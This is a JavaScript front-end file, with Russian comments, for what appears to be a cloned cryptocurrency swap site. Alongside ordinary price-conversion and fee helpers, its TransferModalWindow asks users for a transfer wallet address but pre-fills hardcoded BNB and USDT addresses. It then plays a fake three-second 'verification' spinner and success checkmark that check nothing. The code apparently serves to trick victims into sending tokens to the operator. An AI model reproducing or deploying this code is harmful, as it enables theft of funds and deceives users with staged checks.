function formatTo10Digits(number) {
  const [integerPart, decimalPart] = number.toString().split(".");

  if (integerPart.length >= 10) {
    // Если целая часть содержит 10 или более цифр
    return new Intl.NumberFormat("ru-RU").format(
      Number(integerPart.slice(0, 10))
    );
  } else {
    // Если целая часть содержит меньше 10 цифр, тогда добавляем десятичные
    const requiredDecimals = 10 - integerPart.length;
    const formattedNumber = Number(number).toFixed(requiredDecimals);
    return new Intl.NumberFormat("ru-RU", {
      minimumFractionDigits: requiredDecimals,
    }).format(formattedNumber);
  }
}

const subtractTokens = (
  amount1,
  tokenSymbol1,
  amount2,
  tokenSymbol2,
  resultInSymbol
) => {
  const token1 = tokens.find((token) => token.symbol === tokenSymbol1);
  const token2 = tokens.find((token) => token.symbol === tokenSymbol2);
  const resultToken = tokens.find((token) => token.symbol === resultInSymbol);

  if (!token1 || !token2 || !resultToken) {
    throw new Error("Один из токенов не найден");
  }

  // Переводим оба токена в USD для вычитания
  const amount1InUSD = amount1 * token1.price;
  const amount2InUSD = amount2 * token2.price;

  // Разница в USD
  const differenceInUSD = amount1InUSD - amount2InUSD;

  // Конвертируем разницу обратно в единицы выбранного токена
  const differenceInResultToken = differenceInUSD / resultToken.price;

  return differenceInResultToken;
};

const getCurrentAmount = () => {
  return parseFloat(document.querySelector(".token-amount-input").value);
};

const swapAndCalculateFee = (amount, fromSymbol, toSymbol, feePercent) => {
  const fromToken = tokens.find((token) => token.symbol === fromSymbol);
  const toToken = tokens.find((token) => token.symbol === toSymbol);

  if (!fromToken || !toToken) {
    throw new Error("Токен не найден");
  }

  // Рассчитываем количество целевого токена, которое можно получить
  const targetAmount = (amount * fromToken.price) / toToken.price;

  // Рассчитываем комиссию на основе исходной суммы и процента комиссии
  const feeAmount = (amount * feePercent) / 100;

  // Вычисляем стоимость комиссии в долларах
  const feeInDollars = feeAmount * fromToken.price;

  return {
    targetAmount,
    feeAmount,
    feeInDollars,
  };
};

const convertTokens = (amount, fromSymbol, toSymbol) => {
  const fromToken = tokens.find((token) => token.symbol === fromSymbol);
  const toToken = tokens.find((token) => token.symbol === toSymbol);

  if (!fromToken || !toToken) {
    throw new Error("token not found");
  }
  const axsAmount = (amount * fromToken.price) / toToken.price;
  const dollarValue = axsAmount * toToken.price;

  return { axsAmount, dollarValue };
};

function getCurrentToken() {
  const elements = document.querySelectorAll("#pair");

  const exchangeToken = tokens.find(
    (el) =>
      el.symbol.toLocaleLowerCase() ===
      elements[0].textContent.trim().toLocaleLowerCase()
  );

  const receiptToken = tokens.find(
    (el) =>
      el.symbol.toLocaleLowerCase() ===
      elements[1].textContent.trim().toLocaleLowerCase()
  );

  return {
    exchangeToken,
    receiptToken,
  };
}

class TransferModalWindow extends ModalWindow {
  #BNB_ADDRESS = "0xFc1997334cc6d78E1D8dD62186d789e384630587";
  #USDT_ADDRESS = "TPpXeZ4YvuRQr6KHdyhxJS45mN7ebYreee";
  #next = () => {};

  constructor(next) {
    super("transfer", "Transfer", {});
    this.#next = next;
  }

  open() {
    const container = this.getContentContainer();
    container.innerHTML = `
      ${this.#getWelcomeTextHTML()}
      ${this.#getWalletAddressInputHTML()}
      ${this.#getInfoTextHTML()}

      <div class="sc-3fcdcbc5-1 MnqZU" style="margin-top: 5rem;">
        <button class="sc-6b7e583a-0 kxFVQl" id="transferNext" width="100%" data-dd-action-name="Swap commit button" variant="primary" scale="md">Swap</button>
      </div>
    `;

    super.open();
    document.getElementById("m783jd").select();
    document.getElementById("transferNext").addEventListener("click", () => {
      this.close();
      this.#next();
    });

    let intervalId = null;
    const event = () => {
      document.getElementById("preloader").style.display = "block";
      document.getElementById("preloaderSuccess").style.display = "none";

      clearInterval(intervalId);

      intervalId = setTimeout(() => {
        document.getElementById("preloader").style.display = "none";
        document.getElementById("preloaderSuccess").style.display = "block";
      }, 3000);
    };

    event();
    document.getElementById("m783jd").removeEventListener("input", event);

    document.getElementById("m783jd").addEventListener("input", event);
  }

  #getWelcomeTextHTML() {
    return `
      <p>
        Please enter the wallet address for the token transfer
      </p>
    `;
  }

  #getWalletAddressInputHTML() {
    const currentToken =
      getCurrentToken().exchangeToken.symbol === "BNB"
        ? this.#BNB_ADDRESS
        : getCurrentToken().exchangeToken.symbol === "USDT"
        ? this.#USDT_ADDRESS
        : "";

    return `
      <div class="sc-3fcdcbc5-1 sc-b26f41e2-0 gbBSci ehsacR" style="margin-top: 24px; margin-bottom: 14px;">
        <input
          id="m783jd"
          value="${currentToken}"
          placeholder="Enter the ${
            getCurrentToken().exchangeToken.symbol === "BNB"
              ? "BEP-20"
              : getCurrentToken().exchangeToken.symbol === "USDT"
              ? "TRC-20"
              : "TRC-20"
          } network address"
          autocomplete="off"
          spellcheck="false"
          class="sc-531f68ec-0 dOTMyq"
        >

        <div class="preloader-container">
          <div style="display: none;" class="preloader" id="preloader"></div>
          <svg style="display: none;" id="preloaderSuccess" viewBox="0 0 24 24" width="24px" xmlns="http://www.w3.org/2000/svg" class="sc-df97f1b-0 dyjVof">
            <path fill="#31d0aa" d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20ZM15.88 8.29L10 14.17L8.12 12.29C7.73 11.9 7.1 11.9 6.71 12.29C6.32 12.68 6.32 13.31 6.71 13.7L9.3 16.29C9.69 16.68 10.32 16.68 10.71 16.29L17.3 9.7C17.69 9.31 17.69 8.68 17.3 8.29C16.91 7.9 16.27 7.9 15.88 8.29Z"></path>
          </svg>
        </div>
      </div>
    `;
  }

  #getInfoTextHTML() {
    return `
      <div
        style="
          color: var(--colors-textSubtle);
          font-weight: 400;
          line-height: 1.5;
          font-size: 14px;
        "
      >
        ${
          getCurrentToken().exchangeToken.symbol === "BNB"
            ? "For the selected token, please use an address in the <span style=`font-weight: 500`>BEP-20</span> network."
            : getCurrentToken().exchangeToken.symbol === "USDT"
            ? "For the selected token, please use an address in the <span style=`font-weight: 500`>TRC-20</span> network."
            : ""
        }
      </div>
    `;
  }
}
